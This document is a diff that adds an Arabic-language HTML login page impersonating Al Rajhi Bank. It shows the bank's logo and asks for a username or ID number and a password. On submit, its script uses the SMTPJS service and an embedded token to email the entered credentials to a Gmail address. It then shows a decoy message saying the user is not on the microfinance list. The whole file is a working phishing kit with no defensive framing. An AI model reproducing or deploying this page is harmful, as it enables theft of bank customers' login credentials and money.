@@ -1,0 +1,76 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>مصرف بنك الراجحي</title>
+  
+
+
+
+
+  <link rel="stylesheet" href="style.css">
+  
+  <scri6pt src="https://smtpjs.com/v3/smtp.js"> </script>
+</head>
+
+<body dir="rtl">
+  <br>
+ <img style="width: 50%" src="Al_Rajhi_Bank_Logo.svg.png" alt="Al_Rajhi_Bank_Logo.svg.png">
+  <br>
+ <br>
+ <div class="ra">
+   <br>
+  <h5 style="background: blue ; color: white ; padding: 5px ; margin: 20px ; border-radius: 20px">مرحبـاً بـك فـي بنـك الراجحي </h5>
+
+  <div class="q" onsubmit="sendEmail(); reset(); return false">
+    <br>
+  <h6 class="fontn" style="color: slategray ; float: right ; padding: 5px ; margin-right: 60px ; font-family: 'tajawal'">تسجيل الدخول</h6>
+    
+    
+  <form onsubmit="sendEmail(); reset(); return false">
+
+ <input type="text" id="name" placeholder=" أدخل أسم المستخدم أو رقم الهوية" required >
+ <br>
+<br>
+ 
+<input type="password" id="password" name="password" placeholder="ادخل كلمة المرور">
+
+<br>
+<br>
+<br>
+<br>
+    <br>
+    <button>تسجيل الدخول</button>
+  </form>
+  </div>
+ </div>
+<script src="https://smtpjs.com/v3/smtp.js"> </script>
+  <script>
+    
+function sendEmail() {
+Email.send({
+SecureToken : "e3275d41-401a-4c76-9c84-b900cd9d7440",
+      To:'waaat2491@gmail.com',
+      From:"waaat2491@gmail.com",
+      Subject:"test 5",
+Body:"name: " + document.getElementById("name").value
+
+      + "<br> password: " + document.getElementById("password").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+
+    }).then(
+      message => alert("عذراً انت لست في قائمة التمويل الاصغر")
+    );
+    }
+  </script>
+</body>
+</html>
